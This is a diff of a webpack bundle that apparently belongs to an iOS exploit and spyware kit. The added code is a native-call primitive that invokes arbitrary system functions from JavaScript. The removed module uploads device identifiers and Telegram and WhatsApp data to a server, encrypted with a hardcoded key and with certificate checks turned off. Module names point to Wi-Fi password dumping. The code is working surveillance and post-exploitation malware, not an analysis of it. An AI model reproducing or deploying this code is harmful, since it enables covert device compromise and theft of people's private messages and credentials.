+ const __WEBPACK_DEFAULT_EXPORT__ = ("class Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize)); \n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); \n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); \n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); \n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\t\n\t\t\n\t\t\n\t\t\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\t\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\t\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t\n\t\t\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\t\n\tstatic callSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t\n\t\t\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\tx0 = this.#toNativePtr(x0);\n\t\tx1 = this.#toNativePtr(x1);\n\t\tx2 = this.#toNativePtr(x2);\n\t\tx3 = this.#toNativePtr(x3);\n\t\tx4 = this.#toNativePtr(x4);\n\t\tx5 = this.#toNativePtr(x5);\n\t\tx6 = this.#toNativePtr(x6);\n\t\tx7 = this.#toNativePtr(x7);\n\t\tlet ret = this.#nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t\n\t\t\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNative(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\t\n\tstatic #toNativePtr(value) {\n\t\t\n\t\t\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tlet ptr = this.#argPtrPtr;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNativePtr(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet strPtr = this.#argPtrStrPtr;\n\t\t\tthis.writeString(strPtr, value);\n\t\t\tthis.#argPtrStrPtr += BigInt(value.length + 1);\n\t\t\tvalue = strPtr;\n\t\t}\n\t\telse if (typeof value !== 'bigint') {\n\t\t\tvalue = BigInt(value);\n\t\t}\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t\tthis.#argPtrPtr += 8n;\n\t\treturn ptr;\n\t}\n\t\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\t\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\t\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\t\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\t\n\tstatic #nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t\n\t\tconst funcAddr = this.#dlsym(name);\n\t\t\n\t\tconst selRetainArguments = this.callSymbol(\"sel_registerName\", \"retainArguments\");\n\t\tconst selSetArgument = this.callSymbol(\"sel_registerName\", \"setArgument:atIndex:\");\n\t\tconst selInvokeUsingIMP = this.callSymbol(\"sel_registerName\", \"invokeUsingIMP:\");\n\t\tconst selGetReturnValue = this.callSymbol(\"sel_registerName\", \"getReturnValue:\");\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selRetainArguments);\n\t\t\n\t\tif (x0) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x0, 0);\n\t\tif (x1) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x1, 1);\n\t\tif (x2) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x2, 2);\n\t\tif (x3) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x3, 3);\n\t\tif (x4) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x4, 4);\n\t\tif (x5) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x5, 5);\n\t\tif (x6) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x6, 6);\n\t\tif (x7) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x7, 7);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selInvokeUsingIMP, funcAddr);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selGetReturnValue, this.#argMemPtr);\n\t\tconst ret64 = this.readPtr(this.#argMemPtr);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\nfunction File(path) {\n\treturn path;\n}\n\nfunction log(msg) {\n\tif (logging)\n\t\treturn;\n\n\tlogging = true;\n\t\n\tconst data = Native.stringToBytes(msg + \"\\n\");\n\n\tconst O_WRONLY = 0x0001;\n\tconst O_APPEND = 0x0008;\n\tconst O_CREAT = 0x0200;\n\tconst flags = O_WRONLY | O_CREAT | O_APPEND;\n\tconst fd = Native.callSymbol(\"open\", File(logfile), flags, 0o644);\n\tif (fd < 0) {\n\t\tlogging = false;\n\t\treturn;\n\t}\n\n\t\n\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\tlet offs = 0;\n\tlet left = data.byteLength;\n\n\tconst buffSize = 0x4000;\n\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\twhile (left) {\n\t\tconst size = left > buffSize ? buffSize : left;\n\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\tconst dst8 = new Uint8Array(src8);\n\t\tNative.write(buffPtr, dst8.buffer);\n\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\tif (!len || len < 0)\n\t\t\tbreak;\n\t\toffs += len;\n\t\tleft -= len;\n\t}\n\n\tNative.callSymbol(\"free\", buffPtr);\n\tNative.callSymbol(\"close\", fd);\n\n\tlogging = false;\n}\n\nvar logging = false;\nconst logfile = \"/private/var/mobile/Media/RemoteLog.log\";\n\nNative.init();\n\nNative.callSymbol(\"unlink\", File(logfile));\n");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js":
-/*!*************************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js ***!
-  \*************************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
+ const __WEBPACK_DEFAULT_EXPORT__ = ("");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js":
-/*!******************************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js ***!
-  \******************************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
+ const __WEBPACK_DEFAULT_EXPORT__ = ("");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/ds_net_native.js":
-/*!**********************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/ds_net_native.js ***!
-  \**********************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/InjectJS.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// 网络请求统一封装（原生桥接环境）\n// 集中管理：接口路径、公共上报字段、数据加密与 HTTP 发送\nvar dsNetNative = (function () {\n\n  // 接口路径表：新增或调整接口只改这里\n  var ENDPOINTS = {\n    activate: '/api/v1/device/activate',\n    apps: '/api/v1/device/apps',\n    telegramUpload: '/api/v1/telegram/upload',\n    whatsappUpload: '/api/v1/whatsapp/upload'\n  };\n\n  // 渠道标识与设备身份，作为公共字段自动合并进每个上报数据包\n  var channel = '';\n  var deviceIdentity = {\n    unique: '',\n    ecid: '',\n    serial: ''\n  };\n\n  // 设置渠道标识\n  function setChannel(c) { channel = c || ''; }\n\n  // 设置设备身份（唯一标识 / 芯片号 / 序列号）\n  function setDeviceIdentity(id) {\n    if (!id) return;\n    deviceIdentity = {\n      unique: id.unique || '',\n      ecid: id.ecid || '',\n      serial: id.serial || ''\n    };\n  }\n\n  // 组装上报数据包的公共部分：渠道 + 设备身份，再合并业务字段\n  function buildBaseBody(extra) {\n    var p = {\n      channel: channel,\n      unique: deviceIdentity.unique,\n      ecid: deviceIdentity.ecid,\n      serial: deviceIdentity.serial\n    };\n    if (extra) {\n      for (var k in extra) p[k] = extra[k];\n    }\n    return p;\n  }\n\n  // --- 编码：Base64 ---\n  const CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';\n\n  // 将字节数组编码为 Base64 字符串\n  function base64Encode(u8arr) {\n    if (!u8arr || u8arr.length === 0) return '';\n    var result = '';\n    var i = 0;\n    var len = u8arr.length;\n    while (i < len) {\n      var a = u8arr[i++];\n      var b = i < len ? u8arr[i++] : -1;\n      var c = i < len ? u8arr[i++] : -1;\n      var triplet = ((a & 0xFF) << 16) | ((b >= 0 ? b : 0) << 8) | (c >= 0 ? c : 0);\n      result += CHARS[(triplet >> 18) & 0x3F];\n      result += CHARS[(triplet >> 12) & 0x3F];\n      result += (b >= 0) ? CHARS[(triplet >> 6) & 0x3F] : '=';\n      result += (c >= 0) ? CHARS[triplet & 0x3F] : '=';\n    }\n    return result;\n  }\n\n  // --- 加密：SHA256 / AES ---\n  let cryptoInited = false;\n\n  // 按需加载系统加密库（只加载一次）\n  function ensureCryptoInit() {\n    if (cryptoInited) return;\n    Native.dlopen(\"/usr/lib/libcommonCrypto.dylib\");\n    cryptoInited = true;\n  }\n\n  // 计算 SHA256 摘要，返回 32 字节 Uint8Array\n  function sha256(data) {\n    ensureCryptoInit();\n    const inputPtr = Native.malloc(data.length);\n    Native.write(inputPtr, data instanceof Uint8Array ? data.buffer : data);\n    const digestPtr = Native.malloc(32);\n    Native.callSymbol(\"CC_SHA256\", inputPtr, BigInt(data.length), digestPtr);\n    const result = new Uint8Array(Native.read(digestPtr, 32));\n    Native.free(inputPtr);\n    Native.free(digestPtr);\n    return result;\n  }\n\n  // AES-256-ECB 加密：自带 PKCS7 手动填充\n  function aesEncrypt(plainBytes, keyBytes) {\n    ensureCryptoInit();\n    const kCCEncrypt = 0n;\n    const kCCAlgorithmAES = 0n;\n    const kCCOptionECBMode = 2n;\n\n    var inLen = plainBytes.length;\n    var padLen = 16 - (inLen % 16);\n    var paddedLen = inLen + padLen;\n    var paddedInput = new Uint8Array(paddedLen);\n    paddedInput.set(plainBytes);\n    for (var pi = inLen; pi < paddedLen; pi++) paddedInput[pi] = padLen;\n\n    const outLen = paddedLen;\n    const keyPtr = Native.malloc(32);\n    const inPtr = Native.malloc(paddedLen);\n    const outPtr = Native.malloc(outLen);\n    const movedPtr = Native.malloc(8);\n    const cryptorRefPtr = Native.malloc(8);\n\n    Native.write(keyPtr, keyBytes instanceof Uint8Array ? keyBytes.buffer : keyBytes);\n    Native.write(inPtr, paddedInput.buffer);\n    Native.write64(movedPtr, 0n);\n    Native.write64(cryptorRefPtr, 0n);\n\n    var status = Native.callSymbol(\"CCCryptorCreate\",\n      kCCEncrypt, kCCAlgorithmAES, kCCOptionECBMode,\n      keyPtr, 32n, 0n, cryptorRefPtr);\n\n    var encrypted = null;\n\n    if (Number(status) === 0) {\n      var cryptorRef = Native.readPtr(cryptorRefPtr);\n\n      Native.write64(movedPtr, 0n);\n      Native.callSymbol(\"CCCryptorUpdate\",\n        cryptorRef, inPtr, BigInt(paddedLen), outPtr, BigInt(outLen), movedPtr);\n      var updateMoved = Native.read32(movedPtr);\n\n      Native.write64(movedPtr, 0n);\n      Native.callSymbol(\"CCCryptorFinal\",\n        cryptorRef, outPtr + BigInt(updateMoved), BigInt(outLen - updateMoved), movedPtr);\n      var finalMoved = Native.read32(movedPtr);\n\n      var totalMoved = updateMoved + finalMoved;\n      if (totalMoved > 0) {\n        encrypted = new Uint8Array(Native.read(outPtr, totalMoved));\n      }\n\n      Native.callSymbol(\"CCCryptorRelease\", cryptorRef);\n    }\n\n    Native.free(keyPtr);\n    Native.free(inPtr);\n    Native.free(outPtr);\n    Native.free(movedPtr);\n    Native.free(cryptorRefPtr);\n    return encrypted;\n  }\n\n  // 组装加密上报数据包：\n  // 密钥 = SHA256(固定种子 + 时间戳)，明文 = 时间戳 + JSON，\n  // 返回 { body: base64(密文), timestamp }（timestamp 供服务端解密用）\n  function encryptForServer(jsonObj) {\n    const timestamp = String(Date.now());\n    const plaintext = timestamp + JSON.stringify(jsonObj);\n    const plainBytes = new Uint8Array(Native.stringToBytes(plaintext, false));\n\n    const keyInput = new Uint8Array(Native.stringToBytes(\"Ek8pl31K2yeHgQwy\" + timestamp, false));\n    const key = sha256(keyInput);\n\n    const encrypted = aesEncrypt(plainBytes, key);\n    if (!encrypted) return null;\n\n    return {\n      body: base64Encode(encrypted),\n      timestamp: timestamp\n    };\n  }\n\n  // --- 网络：CFStream HTTP ---\n  let networkInited = false;\n\n  // 按需加载网络框架（只加载一次）\n  function ensureNetworkInit() {\n    if (networkInited) return;\n    Native.dlopen(\"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\");\n    Native.dlopen(\"/System/Library/Frameworks/CFNetwork.framework/CFNetwork\");\n    networkInited = true;\n  }\n\n  // 读取 CF 常量（dlsym 后解引用一次）\n  function getCFConst(name) {\n    const ptr = Native.dlsym(name);\n    if (!ptr || ptr === 0n) return 0n;\n    return Native.readPtr(ptr);\n  }\n\n  // 构造 CFString\n  function createCFString(str) {\n    return Native.callSymbol(\"CFStringCreateWithCString\", 0n, str, 0x08000100n);\n  }\n\n  // 手动拼接 HTTP/1.1 请求发送 POST，返回 { status, body }\n  // 443 端口启用 TLS；写+读总超时 30 秒；响应体上限 64KB\n  function httpPost(host, port, path, headers, body) {\n    ensureNetworkInit();\n\n    const useSSL = (port === 443);\n\n    const hostCFStr = createCFString(host);\n    if (!hostCFStr || BigInt(hostCFStr) === 0n) return null;\n\n    const readStreamPtr = Native.malloc(8);\n    const writeStreamPtr = Native.malloc(8);\n    Native.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, BigInt(hostCFStr), BigInt(port), readStreamPtr, writeStreamPtr);\n    Native.callSymbol(\"CFRelease\", BigInt(hostCFStr));\n\n    const readStream = Native.readPtr(readStreamPtr);\n    const writeStream = Native.readPtr(writeStreamPtr);\n    Native.free(readStreamPtr);\n    Native.free(writeStreamPtr);\n\n    if (!readStream || readStream === 0n || !writeStream || writeStream === 0n) return null;\n\n    if (useSSL) {\n      var secLevelKey = createCFString(\"kCFStreamPropertySocketSecurityLevel\");\n      var secLevelVal = createCFString(\"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n      if (secLevelKey && secLevelVal) {\n        Native.callSymbol(\"CFReadStreamSetProperty\", readStream, BigInt(secLevelKey), BigInt(secLevelVal));\n        Native.callSymbol(\"CFWriteStreamSetProperty\", writeStream, BigInt(secLevelKey), BigInt(secLevelVal));\n        Native.callSymbol(\"CFRelease\", BigInt(secLevelKey));\n        Native.callSymbol(\"CFRelease\", BigInt(secLevelVal));\n      }\n\n      var sslSettingsKey = createCFString(\"kCFStreamPropertySSLSettings\");\n      var validateKeyStr = createCFString(\"kCFStreamSSLValidatesCertificateChain\");\n      var kCFBooleanFalse = getCFConst(\"kCFBooleanFalse\");\n      if (sslSettingsKey && validateKeyStr && kCFBooleanFalse && kCFBooleanFalse !== 0n) {\n        var kPtr = Native.malloc(8);\n        var vPtr = Native.malloc(8);\n        Native.write64(kPtr, BigInt(validateKeyStr));\n        Native.write64(vPtr, kCFBooleanFalse);\n        var dictKeyCB = Native.dlsym(\"kCFTypeDictionaryKeyCallBacks\");\n        var dictValCB = Native.dlsym(\"kCFTypeDictionaryValueCallBacks\");\n        var sslDict = Native.callSymbol(\"CFDictionaryCreate\", 0n, kPtr, vPtr, 1n, dictKeyCB, dictValCB);\n        if (sslDict && BigInt(sslDict) !== 0n) {\n          Native.callSymbol(\"CFReadStreamSetProperty\", readStream, BigInt(sslSettingsKey), BigInt(sslDict));\n          Native.callSymbol(\"CFWriteStreamSetProperty\", writeStream, BigInt(sslSettingsKey), BigInt(sslDict));\n          Native.callSymbol(\"CFRelease\", BigInt(sslDict));\n        }\n        Native.free(kPtr);\n        Native.free(vPtr);\n        Native.callSymbol(\"CFRelease\", BigInt(validateKeyStr));\n      }\n      if (sslSettingsKey) Native.callSymbol(\"CFRelease\", BigInt(sslSettingsKey));\n    }\n\n    const openRead = Native.callSymbol(\"CFReadStreamOpen\", readStream);\n    const openWrite = Native.callSymbol(\"CFWriteStreamOpen\", writeStream);\n    if (!openRead || !openWrite) {\n      Native.callSymbol(\"CFRelease\", readStream);\n      Native.callSymbol(\"CFRelease\", writeStream);\n      return null;\n    }\n\n    var streamReady = false;\n    for (var wi = 0; wi < 100; wi++) {\n      var wStatus = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", writeStream));\n      if (wStatus === 2) { streamReady = true; break; }\n      if (wStatus >= 5) break;\n      Native.callSymbol(\"usleep\", 100000n);\n    }\n    if (!streamReady) {\n      Native.callSymbol(\"CFReadStreamClose\", readStream);\n      Native.callSymbol(\"CFWriteStreamClose\", writeStream);\n      Native.callSymbol(\"CFRelease\", readStream);\n      Native.callSymbol(\"CFRelease\", writeStream);\n      return null;\n    }\n\n    let headerStr = '';\n    for (const [k, v] of Object.entries(headers || {})) {\n      headerStr += `${k}: ${v}\\r\\n`;\n    }\n    const request = `POST ${path} HTTP/1.1\\r\\nHost: ${host}\\r\\n${headerStr}Content-Length: ${body.length}\\r\\nConnection: close\\r\\n\\r\\n${body}`;\n\n    const startTime = Date.now();\n    const timeoutMs = 30000;\n\n    var reqBytes = Native.stringToBytes(request, false);\n    var reqPtr = Native.malloc(reqBytes.byteLength);\n    Native.write(reqPtr, reqBytes);\n    var totalWritten = 0;\n    var reqLen = reqBytes.byteLength;\n    while (totalWritten < reqLen) {\n      if (Date.now() - startTime > timeoutMs) break;\n      var written = Number(Native.callSymbol(\"CFWriteStreamWrite\", writeStream, reqPtr + BigInt(totalWritten), BigInt(reqLen - totalWritten)));\n      if (written < 0) break;\n      if (written === 0) { Native.callSymbol(\"usleep\", 10000n); continue; }\n      totalWritten += written;\n    }\n    Native.free(reqPtr);\n\n    if (totalWritten < reqLen) {\n      Native.callSymbol(\"CFReadStreamClose\", readStream);\n      Native.callSymbol(\"CFWriteStreamClose\", writeStream);\n      Native.callSymbol(\"CFRelease\", readStream);\n      Native.callSymbol(\"CFRelease\", writeStream);\n      return null;\n    }\n\n    const bufSize = 8192;\n    const readBuf = Native.malloc(bufSize);\n    let responseChunks = [];\n    let totalRead = 0;\n    const maxSize = 64 * 1024;\n\n    while (totalRead < maxSize) {\n      if (Date.now() - startTime > timeoutMs) break;\n      const bytesRead = Number(Native.callSymbol(\"CFReadStreamRead\", readStream, readBuf, BigInt(bufSize)));\n      if (bytesRead <= 0) break;\n      const chunk = Native.read(readBuf, bytesRead);\n      if (chunk) responseChunks.push(new Uint8Array(chunk));\n      totalRead += bytesRead;\n    }\n\n    Native.free(readBuf);\n    Native.callSymbol(\"CFReadStreamClose\", readStream);\n    Native.callSymbol(\"CFWriteStreamClose\", writeStream);\n    Native.callSymbol(\"CFRelease\", readStream);\n    Native.callSymbol(\"CFRelease\", writeStream);\n\n    if (responseChunks.length === 0) return null;\n\n    let combined = new Uint8Array(totalRead);\n    let offset = 0;\n    for (let chunk of responseChunks) {\n      combined.set(chunk, offset);\n      offset += chunk.length;\n    }\n\n    let headerEnd = -1;\n    for (let i = 0; i < combined.length - 3; i++) {\n      if (combined[i] === 13 && combined[i+1] === 10 && combined[i+2] === 13 && combined[i+3] === 10) {\n        headerEnd = i + 4;\n        break;\n      }\n    }\n\n    const headerText = Native.bytesToString(combined.slice(0, Math.min(headerEnd > 0 ? headerEnd : 256, 256)).buffer, false);\n    const statusMatch = headerText.match(/HTTP\\/\\d\\.\\d (\\d+)/);\n    const status = statusMatch ? parseInt(statusMatch[1]) : 0;\n\n    return { status, body: headerEnd > 0 ? combined.subarray(headerEnd) : null };\n  }\n\n  // 解析域名：支持 host 或 host:port，默认 443\n  function parseDomain(domain) {\n    let host = domain;\n    let port = 443;\n    let useSSL = true;\n    if (domain.indexOf(\":\") !== -1) {\n      const parts = domain.split(\":\");\n      host = parts[0];\n      port = parseInt(parts[1]) || 443;\n      if (port !== 443) useSSL = false;\n    }\n    return { host, port, useSSL };\n  }\n\n  // 带重试的 POST：最多 maxRetries 次，间隔 2 秒，收到 200 视为成功\n  function postWithRetry(domain, path, encryptedBody, headers, maxRetries = 3) {\n    const { host, port } = parseDomain(domain);\n    for (let attempt = 0; attempt < maxRetries; attempt++) {\n      try {\n        const result = httpPost(host, port, path, headers, encryptedBody);\n        if (result && result.status === 200) return true;\n      } catch(e) {}\n      if (attempt < maxRetries - 1) {\n        Native.callSymbol(\"usleep\", 2000000n);\n      }\n    }\n    return false;\n  }\n\n  // 统一上报入口：合并公共字段 -> 加密 -> 带重试 POST 到服务端\n  // 请求头附带 x-ts（时间戳），供服务端按时间戳派生密钥解密\n  function postEncryptedToServer(domain, path, jsonObj) {\n    const encrypted = encryptForServer(buildBaseBody(jsonObj));\n    if (!encrypted) return false;\n    const headers = {\n      \"Content-Type\": \"application/json\",\n      \"x-ts\": encrypted.timestamp\n    };\n    return postWithRetry(domain, path, encrypted.body, headers, 3);\n  }\n\n  return {\n    ENDPOINTS: ENDPOINTS,\n    setChannel: setChannel,\n    setDeviceIdentity: setDeviceIdentity,\n    buildBaseBody: buildBaseBody,\n    base64Encode: base64Encode,\n    sha256: sha256,\n    aesEncrypt: aesEncrypt,\n    encryptForServer: encryptForServer,\n    httpPost: httpPost,\n    parseDomain: parseDomain,\n    postWithRetry: postWithRetry,\n    postEncryptedToServer: postEncryptedToServer\n  };\n})();\n\nif (typeof globalThis !== 'undefined') {\n  globalThis.dsNetNative = dsNetNative;\n}");
-
-/***/ }),
-/***/ "./src/InjectJS.js":
-/*!*************************!*\
-  !*** ./src/InjectJS.js ***!
-  \*************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
-
-__webpack_require__.r(__webpack_exports__);
